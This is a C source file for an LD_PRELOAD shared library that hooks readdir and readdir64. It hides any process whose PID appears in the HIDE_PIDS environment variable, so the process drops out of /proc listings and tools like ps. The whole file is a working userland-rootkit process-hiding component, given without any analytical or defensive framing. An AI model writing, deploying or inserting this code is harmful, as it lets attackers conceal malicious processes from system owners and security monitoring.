#define _GNU_SOURCE
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <unistd.h>
#include <pthread.h>

/* Original function pointers */
static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
static struct dirent64* (*original_readdir64)(DIR *dirp) = NULL;

/* Hidden PIDs list with bounds checking and synchronization */
#define MAX_HIDDEN_PIDS 1024
static int hidden_pids[MAX_HIDDEN_PIDS] = {0};
static int hidden_pids_count = 0;
static pthread_rwlock_t hidden_pids_lock = PTHREAD_RWLOCK_INITIALIZER;

/* Initialize original function pointers */
static void init_hooks(void) {
	if (!original_readdir) {
		original_readdir = dlsym(RTLD_NEXT, "readdir");
	}
	if (!original_readdir64) {
		original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	}
}

/* Check if a PID should be hidden (must be called with lock held) */
static int is_hidden_unlocked(pid_t pid) {
	for (int i = 0; i < hidden_pids_count; i++) {
		if (hidden_pids[i] == pid) {
			return 1;
		}
	}
	return 0;
}

/* Thread-safe wrapper to check if PID is hidden */
static int is_hidden(pid_t pid) {
	int result;
	pthread_rwlock_rdlock(&hidden_pids_lock);
	result = is_hidden_unlocked(pid);
	pthread_rwlock_unlock(&hidden_pids_lock);
	return result;
}

/* Parse PID from directory entry name */
static pid_t parse_pid(const char *name) {
	char *endptr;
	long pid = strtol(name, &endptr, 10);

	/* Valid PID if entire string was a number */
	if (*endptr == '\0' && pid > 0) {
		return (pid_t)pid;
	}
	return -1;
}

/* Hook readdir to filter hidden processes */
struct dirent* readdir(DIR *dirp) {
	init_hooks();

	struct dirent *entry;
	while ((entry = original_readdir(dirp)) != NULL) {
		pid_t pid = parse_pid(entry->d_name);

		/* If it's a numeric entry and it's hidden, skip it */
		if (pid > 0 && is_hidden(pid)) {
			continue;  /* Try next entry */
		}

		/* Not hidden or not a PID, return it */
		return entry;
	}

	/* End of directory */
	return NULL;
}

/* Hook readdir64 to filter hidden processes */
struct dirent64* readdir64(DIR *dirp) {
	init_hooks();

	struct dirent64 *entry;
	while ((entry = original_readdir64(dirp)) != NULL) {
		pid_t pid = parse_pid(entry->d_name);

		/* If it's a numeric entry and it's hidden, skip it */
		if (pid > 0 && is_hidden(pid)) {
			continue;  /* Try next entry */
		}

		/* Not hidden or not a PID, return it */
		return entry;
	}

	/* End of directory */
	return NULL;
}

/* Environment variable to set hidden PIDs */
void __attribute__((constructor)) init_hidden_pids(void) {
	const char *hidden_env = getenv("HIDE_PIDS");
	if (!hidden_env) {
		return;
	}

	/* Parse space-separated list of PIDs */
	char *env_copy = strdup(hidden_env);
	if (!env_copy) {
		return;
	}

	pthread_rwlock_wrlock(&hidden_pids_lock);

	char *token = strtok(env_copy, " ");
	while (token && hidden_pids_count < MAX_HIDDEN_PIDS) {
		pid_t pid = (pid_t)atoi(token);
		if (pid > 0) {
			hidden_pids[hidden_pids_count++] = pid;
		}
		token = strtok(NULL, " ");
	}

	pthread_rwlock_unlock(&hidden_pids_lock);
	free(env_copy);
}
